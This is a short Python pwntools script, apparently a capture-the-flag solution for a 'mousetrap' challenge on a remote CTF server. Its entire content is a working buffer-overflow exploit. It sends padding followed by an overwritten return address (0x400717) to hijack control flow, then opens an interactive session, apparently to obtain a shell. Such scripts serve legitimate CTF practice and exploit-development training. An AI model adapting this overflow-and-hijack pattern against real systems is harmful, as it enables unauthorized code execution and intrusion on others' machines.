from pwn import *

payload1 = "A"*24+"\x41"

payload2 = "A"*24+"\x17\x07\x40\x00\x00\x00\x00\x00"


p = remote('cha.hackpack.club', 41719)
#p = process('./mousetrap')

print(p.recv())
p.sendline(payload1)
print(p.recv())
p.sendline(payload2)
p.interactive()
